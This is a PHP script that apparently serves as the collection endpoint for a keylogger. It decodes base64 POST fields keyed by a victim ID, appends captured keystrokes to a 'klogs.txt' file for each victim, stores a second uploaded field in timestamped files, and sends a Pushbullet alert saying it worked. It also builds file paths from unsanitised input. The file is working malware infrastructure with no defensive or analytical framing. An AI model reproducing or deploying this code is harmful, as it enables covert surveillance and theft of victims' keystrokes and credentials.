<?php
error_reporting(0);
date_default_timezone_set("Europe/Lisbon");
$k = $_POST["2"];
$basedir = "/full/path/to/files/folder";
$uuid = $_POST["1"];
$p = $_POST["4"];
$tstamp = date("siHdmY");
$fancytstamp = date("[d/m/Y-H:i:s]");
//echo "TSTAMP: " . $tstamp . "\n";
if(!isset($uuid)) {
	$uuid = "NULL";
	//echo "UUID was null\n";
}

else {
	$uuid = base64_decode($uuid);
	$uuid = explode(" ", $uuid);
	$uuid = $uuid[0];
//	echo "UUID: " . $uuid . "\n";
}

if(isset($k)) {
	$k = base64_decode($k);
	$dir = $basedir . $uuid . "/";
	$file = $dir . "klogs.txt";
	if (!is_dir($dir)) {
		mkdir($dir, 0755, true);
	}
	$f = fopen($file, "a");
//	echo "K: " . $k . "\n";
	fwrite($f, "\n" . $fancytstamp . "\n");
	fwrite($f, $k);
	fclose($f);
}

if(isset($p)) {
	$p = base64_decode($p);
	$dir  = $basedir . $uuid . "/";
	if (!is_dir($dir)) {
		mkdir($dir, 0755, true);
	}
	$file = $dir . "p-" . $tstamp . ".txt";
	$f = fopen($file, "w");
	fwrite($f, $p);
	fclose($f);
	chdir('/usr/bin/');
	shell_exec('./pushbullet "Funcionou :D" "P UPLOADED"');
	//shell_exec("pushbullet 'P was uploaded. Woohoo!' 'P UPLOADED'");
}
?>
